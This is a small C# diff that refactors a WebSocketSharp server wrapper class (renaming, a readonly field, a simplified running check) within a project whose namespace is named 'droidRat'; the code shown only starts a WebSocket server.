@@ -1,14 +1,15 @@
-﻿using WebSocket_JE;
+﻿using CSharp_droidRat_GUI_Server.Module.webSocket;
 using WebSocketSharp.Server;
 
+// ReSharper disable once CheckNamespace
 namespace WesocketServer_JE
 {
-    public class WebSocketServerJE
+    public class WebSocketServerJe
     {
-        private WebSocketServer _webSocketServer;
-        private bool _running = false;
+        private bool _running;
+        private readonly WebSocketServer _webSocketServer;
 
-        public WebSocketServerJE(string server)
+        public WebSocketServerJe(string server)
         {
             _webSocketServer = new WebSocketServer(server);
             _webSocketServer.AddWebSocketService<WebSocket>("/websocket");
@@ -16,7 +17,7 @@ namespace WesocketServer_JE
 
         public void Connect()
         {
-            if (_running != false) return;
+            if (_running) return;
             _webSocketServer.Start();
             _running = true;
         }
